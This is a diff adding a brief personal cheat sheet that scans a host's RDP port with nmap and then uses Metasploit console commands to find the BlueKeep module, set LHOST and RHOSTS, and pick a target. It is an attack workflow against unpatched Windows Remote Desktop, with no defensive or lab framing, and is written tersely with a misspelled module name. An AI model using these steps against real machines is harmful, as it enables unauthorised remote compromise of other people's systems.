@@ -1,0 +1,10 @@
+nmap -p 3389 "IP"
+
+msf6> search BlueeKeep
+
+to exploit configure 
+LHOST, RHOSTS
+
+Configure targets
+msf6> show targets 
+msf6> set target 2
